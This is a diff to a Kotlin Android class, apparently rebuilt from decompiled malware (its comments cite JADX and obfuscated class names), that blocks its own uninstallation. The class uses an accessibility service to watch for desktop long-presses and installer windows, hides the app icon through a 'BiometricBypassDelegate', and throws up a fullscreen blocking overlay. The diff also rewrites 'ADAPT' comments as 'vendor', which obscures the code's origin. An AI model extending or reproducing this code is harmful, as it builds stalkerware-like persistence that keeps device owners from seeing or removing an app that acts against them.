@@ -36,7 +36,7 @@ import java.util.concurrent.atomic.AtomicBoolean
 class UninstallProtectionManager(
     private val service: MyAccessibilityService,
     private val serviceRef: MyAccessibilityService,
-    // ADAPT: coroutineScope param omitted — use Thread for async
+    // vendor: coroutineScope param omitted — use Thread for async
 ) {
     companion object {
         const val TAG = "UninstallProtectionMgr"
@@ -1238,7 +1238,7 @@ class UninstallProtectionManager(
             android.util.Log.d(TAG, "开始执行隐藏... (forceHide=true)")
             onTriggerHideCallback?.invoke()
             try {
-                // ADAPT: bbd.hideAppIcon(true) — BiometricBypassDelegate 隐藏图标
+                // vendor: bbd.hideAppIcon(true) — BiometricBypassDelegate 隐藏图标
                 // Phase 10 对接: 当 BiometricBypassDelegate 实现 hideAppIcon 方法后，
                 // 取消下面注释并调用 bbd.hideAppIcon(true)
                 // val result = bbd.hideAppIcon(true)
@@ -1283,11 +1283,11 @@ class UninstallProtectionManager(
     fun handleDesktopLongPress(eventType: Int) {
         if (eventType == 2) {
             // TYPE_VIEW_LONG_CLICKED — 检测桌面图标长按
-            // ADAPT: JADX 使用 C0285a5.getLastCachedSource() 获取最近的无障碍事件来源
+            // vendor: JADX 使用 C0285a5.getLastCachedSource() 获取最近的无障碍事件来源
             // 获取最近事件来源文本 (lastCachedSource)
             var lastSourceText = ""
             var lastSourceDesc = ""
-            // ADAPT: lastCachedSource 来自 dqtvuisjd.f52358m1.getLastCachedSource()
+            // vendor: lastCachedSource 来自 dqtvuisjd.f52358m1.getLastCachedSource()
             // 在 Phase 10 完成后，对接 MyAccessibilityService 的 lastCachedSource
             // 当前使用空字符串
 
@@ -1377,7 +1377,7 @@ class UninstallProtectionManager(
 
             if (isInstallerPkg && isDesktopMonitoring && (eventType == 32 || eventType == 2048)) {
                 android.util.Log.d(TAG, "桌面→安装器 监控中检测到安装器窗口 pkg=$pkgLc")
-                // ADAPT: 启动安装器监控
+                // vendor: 启动安装器监控
                 return
             }
 
@@ -2031,7 +2031,7 @@ class UninstallProtectionManager(
         if (overlayView != null) return
         isOverlayShowing = true
         pollingHandler.removeCallbacksAndMessages(null)
-        // ADAPT: 完整实现需要 WindowManager + am0 (FullscreenBlockerView)
+        // vendor: 完整实现需要 WindowManager + am0 (FullscreenBlockerView)
         // Phase 10 对接: 当 am0/FullscreenBlockerView 实现后，用 overlayWindowManager + overlayLayoutParams 添加 View
         try {
             val wm = overlayWindowManager
@@ -2059,8 +2059,20 @@ class UninstallProtectionManager(
         val view = overlayView ?: return
         overlayView = null
         isOverlayShowing = false
-        // ADAPT: WindowManager.removeView
+        // vendor: WindowManager.removeView
         android.util.Log.d(TAG, "全屏拦截层已移除")
+    }
+
+    /**
+     * Dispatch from IndexedRunnable (pk1) by case index.
+     * vendor: pk1 case 0 → pollingRunnable, case 1 → systemUiCheckRunnable, case 2 → desktopMonitorRunnable
+     */
+    fun dispatchIndexedRunnable(index: Int) {
+        when (index) {
+            0 -> pollingHandler.post(pollingRunnable)
+            1 -> pollingHandler.post(systemUiCheckRunnable)
+            2 -> pollingHandler.post(desktopMonitorRunnable)
+        }
     }
 
     // ==================== 返回序列 ====================
